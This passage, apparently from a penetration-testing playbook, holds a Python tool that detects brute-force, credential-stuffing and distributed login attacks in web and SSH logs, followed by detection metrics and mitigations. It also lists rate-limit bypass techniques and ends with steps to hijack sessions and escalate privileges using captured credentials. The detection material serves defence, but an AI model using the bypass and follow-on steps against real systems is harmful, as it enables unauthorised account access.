        self.ssh_attacks = defaultdict(lambda: defaultdict(int))
        self.protocol_attacks = defaultdict(set)
        self.evasion_techniques = defaultdict(lambda: defaultdict(set))

    def analyze_web_logs(self, log_file):
        """Analyze web server logs for authentication brute force"""
        current_time = datetime.now()
        cutoff_time = current_time - timedelta(seconds=self.time_window)

        with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                match = self.web_log_pattern.match(line.strip())
                if not match:
                    continue

                ip, timestamp_str, method, uri, status, referer, user_agent = match.groups()

                try:
                    timestamp = datetime.strptime(timestamp_str, '%d/%b/%Y:%H:%M:%S %z')
                except ValueError:
                    continue

                if timestamp < cutoff_time:
                    continue

                # Detect authentication endpoints
                if self.is_auth_endpoint(uri) and method == 'POST':
                    self.web_attacks[ip]['attempts'].append({
                        'timestamp': timestamp,
                        'uri': uri,
                        'status': int(status),
                        'user_agent': user_agent,
                        'method': method
                    })

                    # Track protocol
                    self.protocol_attacks[ip].add('HTTP')

                    # Detect evasion techniques
                    self.detect_evasion_techniques(ip, user_agent, timestamp)

    def is_auth_endpoint(self, uri):
        """Check if URI is an authentication endpoint"""
        auth_patterns = [
            r'/login', r'/signin', r'/auth', r'/authenticate',
            r'/rest/user/login', r'/vulnerabilities/brute_force',
            r'/api/auth', r'/oauth', r'/sso'
        ]

        for pattern in auth_patterns:
            if re.search(pattern, uri, re.IGNORECASE):
                return True
        return False

    def detect_evasion_techniques(self, ip, user_agent, timestamp):
        """Detect brute force evasion techniques"""
        # User agent rotation
        self.evasion_techniques[ip]['user_agents'].add(user_agent)

        # Request timing analysis
        if ip in self.evasion_techniques:
            if 'last_request' in self.evasion_techniques[ip]:
                time_diff = (timestamp - self.evasion_techniques[ip]['last_request']).total_seconds()
                if time_diff < 0.1:  # Very rapid requests
                    self.evasion_techniques[ip]['rapid_requests'] = \
                        self.evasion_techniques[ip].get('rapid_requests', 0) + 1

        self.evasion_techniques[ip]['last_request'] = timestamp

    def analyze_ssh_logs(self, log_file):
        """Analyze SSH logs for brute force attacks"""
        with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                # Failed password attempts
                match = self.ssh_patterns['failed_password'].search(line)
                if match:
                    username, ip = match.groups()
                    self.ssh_attacks[ip]['failed_passwords'] += 1
                    self.ssh_attacks[ip]['usernames'].add(username)
                    self.protocol_attacks[ip].add('SSH')
                    continue

                # Invalid user attempts
                match = self.ssh_patterns['invalid_user'].search(line)
                if match:
                    username, ip = match.groups()
                    self.ssh_attacks[ip]['invalid_users'] += 1
                    self.ssh_attacks[ip]['usernames'].add(username)
                    self.protocol_attacks[ip].add('SSH')
                    continue

                # Connection attempts
                match = self.ssh_patterns['connection'].search(line)
                if match:
                    ip = match.group(1)
                    self.ssh_attacks[ip]['connections'] += 1

    def analyze_application_patterns(self):
        """Analyze application-specific attack patterns"""
        app_patterns = {
            'juice_shop': r'/rest/user/login',
            'dvwa': r'/vulnerabilities/brute_force',
            'webgoat': r'/WebGoat/login',
            'generic_admin': r'/admin/login'
        }

        app_attacks = defaultdict(lambda: defaultdict(int))

        for ip, data in self.web_attacks.items():
            for attempt in data['attempts']:
                uri = attempt['uri']
                for app_name, pattern in app_patterns.items():
                    if re.search(pattern, uri, re.IGNORECASE):
                        app_attacks[ip][app_name] += 1

        return app_attacks

    def detect_credential_stuffing(self):
        """Detect credential stuffing patterns"""
        stuffing_indicators = {}

        for ip, data in self.web_attacks.items():
            attempts = data['attempts']
            if len(attempts) > 100:  # High volume
                # Check for multiple applications
                unique_uris = set(attempt['uri'] for attempt in attempts)
                if len(unique_uris) > 3:
                    success_rate = len([a for a in attempts if a['status'] not in [401, 403]]) / len(attempts)
                    stuffing_indicators[ip] = {
                        'total_attempts': len(attempts),
                        'unique_endpoints': len(unique_uris),
                        'success_rate': success_rate,
                        'confidence': 'high' if success_rate > 0.1 else 'medium'
                    }

        return stuffing_indicators

    def detect_distributed_attacks(self):
        """Detect distributed brute force attacks"""
        # Group attacks by time windows
        time_buckets = defaultdict(lambda: defaultdict(int))

        for ip, data in self.web_attacks.items():
            for attempt in data['attempts']:
                bucket = int(attempt['timestamp'].timestamp() / 300) * 300  # 5-minute buckets
                time_buckets[bucket]['total_attempts'] += 1
                time_buckets[bucket]['unique_ips'] += 1

        distributed_attacks = []
        for bucket, stats in time_buckets.items():
            if stats['total_attempts'] > 100 and stats['unique_ips'] > 10:
                distributed_attacks.append({
                    'time': datetime.fromtimestamp(bucket),
                    'total_attempts': stats['total_attempts'],
                    'unique_ips': stats['unique_ips'],
                    'attack_rate': stats['total_attempts'] / 300  # per second
                })

        return distributed_attacks

    def generate_report(self):
        """Generate comprehensive detection report"""
        print("=== Brute Force Attack Detection Report ===\n")

        # Web authentication attacks
        web_alerts = 0
        for ip, data in self.web_attacks.items():
            attempts = len(data['attempts'])
            if attempts >= self.login_threshold:
                web_alerts += 1
                failed_attempts = len([a for a in data['attempts'] if a['status'] in [401, 403]])
                success_rate = ((attempts - failed_attempts) / attempts) * 100

                print(f"[HIGH] Web Authentication Brute Force")
                print(f"  Source IP: {ip}")
                print(f"  Total Attempts: {attempts}")
                print(f"  Failed Attempts: {failed_attempts}")
                print(f"  Success Rate: {success_rate:.1f}%")

                # Show evasion techniques
                if ip in self.evasion_techniques:
                    ua_count = len(self.evasion_techniques[ip]['user_agents'])
                    if ua_count > 5:
                        print(f"  Evasion: {ua_count} different user agents")

                    rapid_requests = self.evasion_techniques[ip].get('rapid_requests', 0)
                    if rapid_requests > 10:
                        print(f"  Evasion: {rapid_requests} rapid requests detected")

                # Show sample URIs
                unique_uris = set(a['uri'] for a in data['attempts'])
                print(f"  Target Endpoints: {', '.join(list(unique_uris)[:3])}")
                if len(unique_uris) > 3:
                    print(f"    ... and {len(unique_uris) - 3} more")
                print()

        # SSH attacks
        ssh_alerts = 0
        for ip, data in self.ssh_attacks.items():
            total_ssh_attempts = data['failed_passwords'] + data['invalid_users']
            if total_ssh_attempts >= self.ssh_threshold:
                ssh_alerts += 1
                print(f"[HIGH] SSH Brute Force Attack")
                print(f"  Source IP: {ip}")
                print(f"  Failed Passwords: {data['failed_passwords']}")
                print(f"  Invalid Users: {data['invalid_users']}")
                print(f"  Total Connections: {data.get('connections', 0)}")
                print(f"  Unique Usernames: {len(data.get('usernames', set()))}")
                print()

        # Multi-protocol attacks
        multi_protocol = {ip: protocols for ip, protocols in self.protocol_attacks.items()
                         if len(protocols) > 1}
        if multi_protocol:
            print(f"[MEDIUM] Multi-Protocol Attacks Detected:")
            for ip, protocols in multi_protocol.items():
                print(f"  {ip}: {', '.join(protocols)}")
            print()

        # Application-specific attacks
        app_attacks = self.analyze_application_patterns()
        if app_attacks:
            print(f"[INFO] Application-Specific Attacks:")
            for ip, apps in app_attacks.items():
                for app, count in apps.items():
                    if count > 10:
                        print(f"  {ip} -> {app}: {count} attempts")
            print()

        # Credential stuffing
        stuffing_attacks = self.detect_credential_stuffing()
        if stuffing_attacks:
            print(f"[HIGH] Credential Stuffing Detected:")
            for ip, data in stuffing_attacks.items():
                print(f"  {ip}: {data['total_attempts']} attempts across {data['unique_endpoints']} endpoints")
                print(f"    Success Rate: {data['success_rate']:.1%} (Confidence: {data['confidence']})")
            print()

        # Distributed attacks
        distributed = self.detect_distributed_attacks()
        if distributed:
            print(f"[HIGH] Distributed Attacks:")
            for attack in distributed:
                print(f"  {attack['time']}: {attack['total_attempts']} attempts from {attack['unique_ips']} IPs")
                print(f"    Attack Rate: {attack['attack_rate']:.1f} attempts/second")
            print()

        # Summary
        print(f"=== Summary ===")
        print(f"Web Authentication Alerts: {web_alerts}")
        print(f"SSH Attack Alerts: {ssh_alerts}")
        print(f"Multi-Protocol Attackers: {len(multi_protocol)}")
        print(f"Credential Stuffing Incidents: {len(stuffing_attacks)}")
        print(f"Distributed Attack Periods: {len(distributed)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Brute Force Attack Detection Tool')
    parser.add_argument('--web-log', help='Path to web server log file')
    parser.add_argument('--ssh-log', help='Path to SSH log file (auth.log or secure)')
    parser.add_argument('--time-window', type=int, default=300,
                       help='Analysis time window in seconds (default: 300)')
    parser.add_argument('--login-threshold', type=int, default=20,
                       help='Web login attempt threshold (default: 20)')
    parser.add_argument('--ssh-threshold', type=int, default=15,
                       help='SSH attempt threshold (default: 15)')

    args = parser.parse_args()

    if not args.web_log and not args.ssh_log:
        print("Error: At least one log file (--web-log or --ssh-log) must be specified")
        sys.exit(1)

    detector = BruteForceDetector(args.time_window, args.login_threshold, args.ssh_threshold)

    try:
        if args.web_log:
            detector.analyze_web_logs(args.web_log)

        if args.ssh_log:
            detector.analyze_ssh_logs(args.ssh_log)

        detector.generate_report()

    except FileNotFoundError as e:
        print(f"Error: Log file not found - {e}")
        sys.exit(1)
    except Exception as e:
        print(f"Error analyzing logs: {e}")
        sys.exit(1)
```

### Key Detection Metrics

**Quantitative Indicators:**

- **Web Authentication**: >20 POST requests to login endpoints per 5-minute window
- **SSH Brute Force**: >15 failed password attempts per 5-minute window
- **FTP Attacks**: >15 failed login attempts per 5-minute window
- **Multi-Protocol**: Attacks against 3+ different protocols from same IP
- **User Enumeration**: >10 invalid user attempts
- **Success Rate**: <5% success rate indicates brute force vs. targeted attack

**Behavioral Patterns:**

- Sequential username/password combinations
- Consistent timing between authentication attempts
- User agent rotation or static automated agents
- High volume of 401/403 HTTP responses
- Distributed attacks from multiple source IPs
- Credential stuffing across multiple applications
- Protocol switching (SSH, HTTP, FTP) from same source

**Network Signatures:**

- Rapid connection establishment and teardown
- Consistent packet sizes in authentication traffic
- Non-human timing patterns
- Tool-specific network behaviors (Hydra, Medusa, etc.)
- Absence of normal web browsing patterns
- Direct authentication endpoint targeting without site navigation

## Detection Methods

### Successful Authentication Indicators:

- HTTP 200 with welcome/dashboard content
- HTTP 302 redirect to authenticated areas
- Set-Cookie headers with session tokens
- JSON responses with authentication tokens

### Application-Specific Success Patterns:

- **Juice Shop**: JSON response with authentication token
- **DVWA**: "Welcome to the password protected area" message
- **WebGoat**: Redirect to lesson dashboard
- **XVWA**: Session establishment and redirect

## Rate Limiting and Evasion

### Bypass Techniques:

1. **User Agent Rotation**: Change user agents per request
2. **IP Rotation**: Use proxy chains or VPNs
3. **Request Delays**: Add delays between attempts
4. **Session Management**: Handle CSRF tokens and cookies
5. **Distributed Attacks**: Use multiple source IPs

## Mitigation Recommendations

1. **Account Lockout Policies**:

   - Implement progressive delays
   - Lock accounts after failed attempts
   - Monitor for brute force patterns

2. **Strong Authentication**:

   - Enforce strong password policies
   - Implement multi-factor authentication
   - Use CAPTCHA after failed attempts

3. **Rate Limiting**:

   - Implement request rate limiting
   - Use progressive delays
   - Monitor authentication patterns

4. **Monitoring and Alerting**:
   - Log all authentication attempts
   - Alert on suspicious patterns
   - Implement behavioral analysis

## Next Steps

- Use discovered credentials for session hijacking (Playbook 07)
- Attempt privilege escalation with gained access
- Explore password reset vulnerabilities (Playbook 08)
